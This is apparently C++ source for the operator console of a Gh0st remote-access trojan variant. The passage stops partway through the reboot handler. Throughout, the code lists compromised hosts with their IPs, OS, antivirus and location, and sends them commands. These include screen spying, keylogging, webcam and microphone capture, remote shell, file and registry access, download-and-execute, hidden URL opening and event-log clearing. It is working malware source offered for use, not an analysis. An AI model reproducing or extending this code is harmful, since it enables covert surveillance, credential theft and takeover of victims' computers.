// XXXView.cpp : implementation of the CGh0stView class
//

#include "stdafx.h"
#include "gh0st.h"

#include "gh0stDoc.h"
#include "gh0stView.h"
#include "MainFrm.h"

#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "InputDlg.h"
#include "ChangeGroup.h"
#include "SendMsg.h"
#include "ClienttProxy.h"
#include "RegDlg.h"
#include "ServersDlg.h"
#include "SysInfo.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CGh0stView* g_pConnectView;
extern CMainFrame* g_pFrame;
extern CIOCPServer *m_iocpServer;
#define ID_REPORT_CONTROL 100

typedef struct
{
	char	*title;
	int		nWidth;
}ListHeartData;

ListHeartData g_Heart_Data[] =
{
	{_T("分组|外网IP"),		140	},
	{_T("内网IP"),			95	},
	{_T(" 类型"),			43	},
	{_T(" 主机名|备注"),	80	},
	{_T(" 操作系统"),		70	},
	{_T(" CPU处理器"),		75	},
	{_T(" 内存|硬盘"),		75	},
	{_T("视频"),			37	},
	{_T(" 延迟"),			40	},
	{_T("杀毒|软件"),		85	},
	{_T("地理位置"),		120	}
};
/////////////////////////////////////////////////////////////////////////////
// CGh0stView

IMPLEMENT_DYNCREATE(CGh0stView, CXTPReportView)

BEGIN_MESSAGE_MAP(CGh0stView, CXTPReportView)
	//{{AFX_MSG_MAP(CGh0stView)
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_WM_SETFOCUS()
	ON_WM_ERASEBKGND()
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_CLEANEVENT, OnCleanevent)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_CHANGEGROUP, OnChangegroup)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_SEND_MSG, OnSendMsg)
	ON_COMMAND(IDM_PROXY, OnProxy)
	ON_COMMAND(IDM_REGEDIT, OnRegedit)
	ON_COMMAND(IDM_SERVICES, OnServices)
	ON_COMMAND(IDM_START_HIDE, OnStartHide)
	ON_COMMAND(IDM_NO_START, OnNoStart)
	ON_COMMAND(IDM_START_NORMAL, OnStartNormal)
	ON_COMMAND(stopSD, OnstopSD)
	ON_COMMAND(IDM_SYSINFO, OnSysinfo)
	//}}AFX_MSG_MAP
	ON_NOTIFY(NM_DBLCLK, XTP_ID_REPORT_CONTROL, OnReportItemDblClick)
	ON_NOTIFY(NM_RCLICK, XTP_ID_REPORT_CONTROL, OnReportItemRClick)
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_WEBCAM_NODEVICE, OnWebCamNoDevice)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)
	ON_MESSAGE(WM_OPENSERVERSDIALOG, OnOpenServersDialog) 
	ON_MESSAGE(WM_OPENSYSINFODIALOG, OnOpenSysInfoDialog)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stView construction/destruction

CGh0stView::CGh0stView()
{
	// TODO: add construction code here
	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
	g_pConnectView = this;
}

CGh0stView::~CGh0stView()
{
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs

	return CView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView drawing

void CGh0stView::OnDraw(CDC* pDC)
{
	CGh0stDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView diagnostics

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CGh0stView message handlers
class CRecordPropertyIcon : public CXTPReportRecordItem
{	
public:
	CRecordPropertyIcon(int nIcon, CString strCaption)
	{	
		SetCaption(strCaption);
		if (nIcon >= 0)
			SetIconIndex(nIcon);
		else
		{
			CString strName;
			int n = strCaption.ReverseFind('(');
			if( n > 0 )
			{
				strName = strCaption.Left(n);
			}
			else
			{
				strName = strCaption;
			}
			SetTooltip(strName);
		}
	}
};

class CRecordPropertyGroup : public CXTPReportRecord
{	
public:
	CRecordPropertyGroup(int nIcon, CString strCaption)
	{
		AddItem(new CRecordPropertyIcon(nIcon, strCaption));
	}
};


int CGh0stView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	// TODO: Add your specialized creation code here
	if (!m_wndReport.Create(WS_CHILD|WS_TABSTOP|WS_VISIBLE|WM_VSCROLL, CRect(0, 0, 0, 0), this, ID_REPORT_CONTROL))
	{
		TRACE(_T("Failed to create view window\n"));
		return -1;
	}

	CImageList I_ImageList;
	I_ImageList.Create(16, 16, ILC_COLOR24 | ILC_MASK, 2, 2);
	HICON hIcon = NULL;//以下为加入3个图标资源
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_NOCAM), IMAGE_ICON, 16, 16, 0);
	I_ImageList.Add(hIcon);
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_CAM), IMAGE_ICON, 16, 16, 0);
	I_ImageList.Add(hIcon);
	m_wndReport.SetImageList(&I_ImageList);

	m_wndReport.GetReportHeader()->AllowColumnRemove(FALSE);
	CXTPReportColumn* pColumn = m_wndReport.AddColumn(new CXTPReportColumn(0, g_Heart_Data[0].title, g_Heart_Data[0].nWidth, FALSE, -1));
	pColumn->SetTreeColumn(TRUE);
	pColumn->EnableResize(TRUE);
	pColumn->SetEditable(FALSE);
	int i = 1;
	for (; i < sizeof(g_Heart_Data)/sizeof(g_Heart_Data[0]) - 1; i++)
	{
		CXTPReportColumn* pNormalColumn = m_wndReport.AddColumn(new CXTPReportColumn(i, g_Heart_Data[i].title, g_Heart_Data[i].nWidth, FALSE, -1));
		pNormalColumn->EnableResize(TRUE);
		pNormalColumn->SetEditable(FALSE);
	}
	m_wndReport.AddColumn(new CXTPReportColumn(i, g_Heart_Data[i].title, g_Heart_Data[i].nWidth));
	CXTPReportRecord* pRecordRoot = m_wndReport.AddRecord(new CRecordPropertyGroup(-1, _T("Default(0)")));

	pRecordRoot->SetExpanded(TRUE);
	m_wndReport.Populate();
	m_wndReport.SetMultipleSelection(TRUE);
	m_wndReport.SetTheme(xtpReportThemeVisualStudio2012Dark, TRUE);
/*
xtpReportColumnShaded,      // Columns are gray shaded.
xtpReportColumnFlat,        // Flat style for drawing columns.
xtpReportColumnExplorer,    // Explorer column style
xtpReportColumnOffice2003,  // Gradient column style
xtpReportColumnResource   // Office 2007/2010 column style
*/
	return 0;
}

void CGh0stView::OnSize(UINT nType, int cx, int cy) 
{
	CView::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (m_wndReport.GetSafeHwnd())
	{
		m_wndReport.MoveWindow(0, 0, cx, cy);
	}
}

BOOL CGh0stView::OnEraseBkgnd(CDC* pDC) 
{
	// TODO: Add your message handler code here and/or call default
	return TRUE;
}

void CGh0stView::OnSetFocus(CWnd* pOldWnd) 
{
	CXTPReportView::OnSetFocus(pOldWnd);
	
	// TODO: Add your message handler code here
	m_wndReport.SetFocus();
}


void CGh0stView::OnReportItemDblClick(NMHDR * pNotifyStruct, LRESULT * /*result*/)
{
	XTP_NM_REPORTRECORDITEM* pItemNotify = (XTP_NM_REPORTRECORDITEM*) pNotifyStruct;
	
	if (pItemNotify->pRow)
	{
		if (!pItemNotify->pRow->GetParentRow())
		{
			pItemNotify->pRow->SetExpanded(!pItemNotify->pRow->IsExpanded());
		}
	}
}

char *CGh0stView::SwitchSystem(OSVERSIONINFOEX OsVerInfoEx)
{	
	TCHAR *pszOS = NULL;
	switch (OsVerInfoEx.dwPlatformId)
	{
	case VER_PLATFORM_WIN32_NT:
		if ( OsVerInfoEx.dwMajorVersion <= 4 )
		{
			pszOS = _T("WinNT");
		}
		else if( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1 )
		{
			pszOS = _T("WinXP");
			g_pFrame->nXP++;
		}
		else if( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 1 )
		{
			if(OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = _T("Win7");
				g_pFrame->nWin7++;
			}
			else
			{
				pszOS = _T("Other");
				g_pFrame->nOther++;
			}
		}
		else if( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 2)
		{
			if(OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = _T("Win8");
				g_pFrame->nWin8++;
			}
			else
			{
				pszOS = _T("Win2012");
				g_pFrame->n2012++;
			}
		}
		else if( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 3)
		{
			if(OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = _T("Win8");
				g_pFrame->nWin8++;
			}
			else
			{
				pszOS = _T("Win2012");
				g_pFrame->n2012++;
			}
		}
		else if( OsVerInfoEx.dwMajorVersion == 10 && OsVerInfoEx.dwMinorVersion == 0 )
		{
			if(OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				if( OsVerInfoEx.dwBuildNumber >= 22000 )
				{
					pszOS = _T("Win11");
					g_pFrame->nWin11++;
				}
				else
				{
					pszOS = _T("Win10");
					g_pFrame->nWin10++;
				}
			}
			else
			{
				if( OsVerInfoEx.dwBuildNumber < 17763 )
				{
					pszOS = _T("Win2016");
					g_pFrame->n2016++;
				}
				else if( OsVerInfoEx.dwBuildNumber < 20348 )
				{
					pszOS = _T("Win2019");
					g_pFrame->n2019++;
				}
				else if( OsVerInfoEx.dwBuildNumber < 26100 )
				{
					pszOS = _T("Win2022");
					g_pFrame->n2022++;
				}
				else
				{
					pszOS = _T("Win2025");
					g_pFrame->n2025++;
				}
			}
		}
		else{

            	pszOS = _T("Other");
				g_pFrame->nOther++;
		}
		
	}
	return pszOS;
}

void CGh0stView::AddtoReportView(ClientContext	*pContext, MYLOGIN*	LoginInfo, CXTPReportRecords* Records, int i, CXTPReportRecord* NewRecord)
{	

	CString str, strToolTipsText, strOS, strPwd;

	// 外网IP
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	CXTPReportRecord* Childs = NULL;
	if (Records == NULL)
	{
		Childs = NewRecord->GetChilds()->Add(new CRecordPropertyGroup(LoginInfo->bIsWebCam, IPAddress));
	}
	else
	{
		Childs = Records->GetAt(i)->GetChilds()->Add(new CRecordPropertyGroup(LoginInfo->bIsWebCam, IPAddress));
	}
	// 内网IP
	CString LanAddress = inet_ntoa(LoginInfo->IPAddress);
	Childs->AddItem(new CRecordPropertyIcon(-1, LanAddress.AllocSysString()))->SetItemData((DWORD_PTR) pContext); // 指定唯一标识
	// 网络类型
	if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
	{
		if (strcmp(inet_ntoa(LoginInfo->IPAddress), "127.0.0.1") != 0 )
			Childs->AddItem(new CRecordPropertyIcon(-1, _T("外网")));
		else
			Childs->AddItem(new CRecordPropertyIcon(-1, _T("本地")));       
	}
	else
		Childs->AddItem(new CRecordPropertyIcon(-1, _T("内网")));
	// 主机名
	Childs->AddItem(new CRecordPropertyIcon(-1, LoginInfo->HostName));
	// 系统  SP%d去掉了
	strOS.Format( _T("%s"), SwitchSystem(LoginInfo->OsVerInfoEx), LoginInfo->OsVerInfoEx.wServicePackMajor );
	Childs->AddItem(new CRecordPropertyIcon(-1, strOS));
	// CPU
	str.Format(_T("%d×%dMHz"), LoginInfo->nCPUNumber, LoginInfo->dwCPUClockMhz);
	Childs->AddItem(new CRecordPropertyIcon(-1, str));
	// 内存/硬盘
	str.Format(_T("%uM|%uG"), LoginInfo->dwMemSpace, LoginInfo->dwDiskSize );
	Childs->AddItem(new CRecordPropertyIcon(-1, str));
	// 视频
	str = LoginInfo->bIsWebCam ? _T("Yes") : _T("-/-");
	Childs->AddItem(new CRecordPropertyIcon(-1, str));
	// Speed
	str.Format(_T("%d"), LoginInfo->dwSpeed);
	Childs->AddItem(new CRecordPropertyIcon(-1, str));     
	// 杀毒软件
//	Childs->AddItem(new CRecordPropertyIcon(-1, LoginInfo->szAntiVirus));

	if (strlen(LoginInfo->szAntiVirus) == 0)
	{
		Childs->AddItem(new CRecordPropertyIcon(-1, _T("-/-")));
	}else
	{
        Childs->AddItem(new CRecordPropertyIcon(-1, LoginInfo->szAntiVirus));
	}

	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		str = m_QQwry->IPtoAdd(IPAddress);
		Childs->AddItem(new CRecordPropertyIcon(-1, str));
		
		strToolTipsText += "\nArea: ";
		strToolTipsText += str;
	}
	else
	{
		str.Format("没有找到IP数据库");
		Childs->AddItem(new CRecordPropertyIcon(-1, str));
	}
	m_wndReport.Populate();

	UpGroupNum();
	g_pFrame->nCount++;
	g_pFrame->ShowNumber();
	g_pFrame->UpdateOS(g_pFrame->nXP,g_pFrame->nWin7,g_pFrame->nWin8,g_pFrame->n2012,g_pFrame->nWin10,g_pFrame->nWin11,
		g_pFrame->n2016,g_pFrame->n2019,g_pFrame->n2022,g_pFrame->n2025,g_pFrame->nOther);
}


LRESULT CGh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(MYLOGIN))
		return -1;
	MYLOGIN*	LoginInfo = (MYLOGIN*)pContext->m_DeCompressionBuffer.GetBuffer();
	BOOL bFind = false;
	CString strGroupName, strLoginGroup;
//	AfxMessageBox(LoginInfo->szGroup);
	if (lstrlen(LoginInfo->szGroup) != 0)
	{
		strLoginGroup.Format(_T("%s"), /*MyDecode(*/LoginInfo->szGroup/*)*/);
		lstrcpy(pContext->m_group, strLoginGroup);
	}
	else
	{	
		strLoginGroup.Format(_T("%d"), GetTickCount);
		lstrcpy(pContext->m_group, _T("Default"));
		lstrcpy(pContext->m_group, strLoginGroup);
	}
	CXTPReportRecords* Records = m_wndReport.GetRecords();
	int nTree = Records->GetCount();
	for (int i = 0; i < nTree; i++)
	{
		strGroupName = Records->GetAt(i)->GetItem(0)->GetTooltip();
		if (strGroupName == pContext->m_group)
		{
			bFind = true;
			AddtoReportView(pContext, LoginInfo, Records, i, NULL);
			break;
		}
	}
	if (!bFind)
	{	
		strGroupName.Format(_T("%s(1)"), LoginInfo->szGroup);
		CXTPReportRecord* NewRecord = m_wndReport.AddRecord(new CRecordPropertyGroup(-1, strGroupName));
		AddtoReportView(pContext, LoginInfo, NULL, nTree, NewRecord);
	}
	return 0;
}

LRESULT CGh0stView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	CXTPReportRecords* Records = m_wndReport.GetRecords();
	int nTree = Records->GetCount();
	for (int i = 0; i < nTree; i++)
	{	
		// 关闭相关窗口
		if (pContext->m_Dialog[0] > 0)
		{	
			switch (pContext->m_Dialog[0])
			{
			case FILEMANAGER_DLG:
			case SCREENSPY_DLG:
			case WEBCAM_DLG:
			case AUDIO_DLG:
			case KEYBOARD_DLG:
			case SYSTEM_DLG:
			case SHELL_DLG:
			case REGEDIT_DLG:
				((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
				break;
			default:
				break;
			}
		}
//		if (pContext->m_group == Records->GetAt(i)->GetItem(0)->GetTooltip())
//		{	
			int nItem = Records->GetAt(i)->GetChilds()->GetCount();
			for (int n = 0; n < nItem; n++)
			{
				if (pContext == (ClientContext *)Records->GetAt(i)->GetChilds()->GetAt(n)->GetItem(1)->GetItemData())
				{
					CString strOS = Records->GetAt(i)->GetChilds()->GetAt(n)->GetItem(4)->GetTooltip();
					if (strOS.Find(_T("WinXP")) != -1)
					{
						g_pFrame->nXP--;
					}
					else if (strOS.Find(_T("Win7")) != -1)
					{
						g_pFrame->nWin7--;
					}
					else if (strOS.Find(_T("Win8")) != -1)
					{
						g_pFrame->nWin8--;
					}
					else if (strOS.Find(_T("Win2012")) != -1)
					{
						g_pFrame->n2012--;
					}
					else if (strOS.Find(_T("Win10")) != -1)
					{
						g_pFrame->nWin10--;
					}
					else if (strOS.Find(_T("Win11")) != -1)
					{
						g_pFrame->nWin11--;
					}
					else if (strOS.Find(_T("Win2016")) != -1)
					{
						g_pFrame->n2016--;
					}
					else if (strOS.Find(_T("Win2019")) != -1)
					{
						g_pFrame->n2019--;
					}
					else if (strOS.Find(_T("Win2022")) != -1)
					{
						g_pFrame->n2022--;
					}
					else if (strOS.Find(_T("Win2025")) != -1)
					{
						g_pFrame->n2025--;
					}
					else{
						g_pFrame->nOther--;
					}
					Records->GetAt(i)->GetChilds()->GetAt(n)->Delete();
					m_wndReport.Populate();
					UpGroupNum();
					g_pFrame->nCount--;
					g_pFrame->ShowNumber();
					g_pFrame->UpdateOS(g_pFrame->nXP,g_pFrame->nWin7,g_pFrame->nWin8,g_pFrame->n2012,g_pFrame->nWin10,g_pFrame->nWin11,
						g_pFrame->n2016,g_pFrame->n2019,g_pFrame->n2022,g_pFrame->n2025,g_pFrame->nOther);
					break;
				}	
			}
//		}
	}
	return 0;
}

void CGh0stView::UpGroupNum()
{
	CXTPReportRecords* Records = m_wndReport.GetRecords();
	int nTree = Records->GetCount();
	for (int i = 0; i < nTree; i++)
	{
// 		if (strGroupName == Records->GetAt(i)->GetItem(0)->GetTooltip())
// 		{
			int nCount = Records->GetAt(i)->GetChilds()->GetCount();
			CString strName;
			strName.Format(_T("%s(%d)"), Records->GetAt(i)->GetItem(0)->GetTooltip(), nCount);
			Records->GetAt(i)->GetItem(0)->SetCaption(strName);
//			break;
//		}
	}
}

void CGh0stView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	// TODO: Add your command handler code here
	CXTPReportSelectedRows* SelRows = m_wndReport.GetSelectedRows();
	POSITION pos = SelRows->GetFirstSelectedRowPosition();
	while(pos)
	{
		CXTPReportRow* NextRow = SelRows->GetNextSelectedRow(pos);
		CXTPReportRecord* Record = NextRow->GetRecord();
		if (!Record->GetParentRecord())
			continue;
		ClientContext* pContext = (ClientContext*)Record->GetItem(1)->GetItemData();
		m_iocpServer->Send(pContext, pData, nSize);
	}
}

void CGh0stView::OnFilemanager() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnReportItemRClick(NMHDR * pNotifyStruct, LRESULT * /*result*/)
{
	XTP_NM_REPORTRECORDITEM* pItemNotify = (XTP_NM_REPORTRECORDITEM*) pNotifyStruct;
	
	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_wndReport.GetSelectedRows() == 0)
	{
		for (int i = 0; i < count - 2; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		
	}

	// 全选
	if (g_pFrame->nCount > 0)
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_ENABLED);
	else
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);

	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,
	p.x, p.y, AfxGetMainWnd(), 0, 0, ((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());
//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	
}

LRESULT CGh0stView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{
	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	
	return 0;
}

LRESULT CGh0stView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);
	//设置父窗口为卓面
    dlg->Create(IDD_REG_DIALOG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenServersDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
	CServersDlg	*dlg = new CServersDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SERVERS_DIALOG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = SERVERS_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}

LRESULT CGh0stView::OnWebCamNoDevice(WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(wParam);
	UNREFERENCED_PARAMETER(lParam);
	MessageBox(_T("远程主机未检测到视频采集设备（摄像头），或摄像头正被其他程序占用。"), _T("视频查看"), MB_OK | MB_ICONINFORMATION);
	// 视频子连接由被控端自行关闭并由 IOCP 回收，这里不触碰 pContext，避免悬垂指针
	return 0;
}

LRESULT CGh0stView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}


LRESULT CGh0stView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenSysInfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSysInfo	*dlg = new CSysInfo(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSINFO_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
	return 0;
}

void CGh0stView::OnScreenspy() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnKeyboard() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnRemoteshell() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SHELL;
 	SendSelectCommand(&bToken, sizeof(BYTE));
//	SendDllCommand("remoteshell",NULL,0);
}

void CGh0stView::OnSystem() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));
//	SendDllCommand("System",NULL,0);
}

void CGh0stView::OnWebcam() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectCommand(&bToken, sizeof(BYTE));
//	SendDllCommand("WebCam",NULL,0);
}

void CGh0stView::OnAudioListen() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectCommand(&bToken, sizeof(BYTE));
//	SendDllCommand("AudioListen",NULL,0);
}

void CGh0stView::OnSysinfo() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSINFO;
	SendSelectCommand(&bToken, sizeof(BYTE));
//	SendDllCommand("AudioListen",NULL,0);	
}


void CGh0stView::OnRemove() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认卸载服务端吗", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnLogoff() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认注销服务端吗", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void CGh0stView::OnReboot() 
{
